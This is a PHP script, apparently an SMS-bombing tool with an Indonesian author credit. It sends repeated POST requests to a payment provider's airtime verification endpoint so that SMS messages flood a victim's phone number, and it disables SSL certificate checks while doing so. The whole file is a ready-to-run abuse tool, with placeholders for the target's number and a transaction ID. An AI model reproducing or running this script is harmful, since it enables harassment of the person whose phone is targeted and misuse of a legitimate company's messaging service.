<?php
// Copyright: YarzC0de
$nomer = 'Input-Nomor-HP';
$i = 0;
$jumlah = "10";
$TxnId = "Input-Txn-ID";

for($i=0; $i<$jumlah; $i++){
$send = curl($nomer, $TxnId);
if(preg_match("/silakan cek SMS pada handphone/", $send)) {
	echo "Berhasil mengirim sms ke nomor ".$nomer." <br />";
} else {
	echo "Gagal Mengirim sms ke nomor ".$nomer." <br />";
}
}

function curl($nomer, $txid) {
	$ar = 'TxnId='.$txid.'&MnoId=0&input_phone_number='.$nomer.'&ga_client_id=106326672.1504001945';
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://airtime.codapayments.com/airtime/msisdn");
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_HEADER, false);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $ar);
	$a = curl_exec($ch);
	curl_close($ch);

	return $a;
}
